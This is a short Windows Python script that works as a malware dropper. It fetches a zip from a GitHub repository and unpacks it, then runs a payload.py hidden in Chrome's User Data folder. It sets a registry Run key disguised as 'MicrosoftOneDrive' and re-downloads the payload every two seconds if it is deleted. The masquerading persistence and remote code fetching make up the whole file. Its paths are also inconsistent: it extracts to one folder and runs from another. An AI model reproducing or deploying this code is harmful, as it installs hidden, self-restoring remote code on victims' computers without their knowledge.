import requests 
import os
import shutil
from zipfile import ZipFile
import subprocess
import getpass
from time import sleep
import winreg

user = getpass.getuser()

filepaths = [fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime", 
             fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\payload.py",
]



def redownload():
    if os.path.exists(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime"):
        shutil.rmtree(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")

    r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")

    with open(fr"C:\Users\{user}\AppData\Local\OneDrive\cache\runtime.zip", "wb") as f:
        f.write(r.content)

    with ZipFile(fr"C:\Users\{user}\AppData\Local\OneDrive\cache\runtime.zip", "r") as f:
        f.extractall(fr"C:\Users\{user}\AppData\Local\OneDrive\cache\runtime")
    os.remove(fr"C:\Users\{user}\AppData\Local\OneDrive\cache\runtime.zip")
    
    return
    


def main():
    while True:
        for path in filepaths:
            if os.path.exists(path):
                pass
            else:
                redownload()
        
        runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\run.vbs")
        runkey.Close()
            
        sleep(2)

subprocess.run(["python", fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\payload.py"], cwd=fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
main()
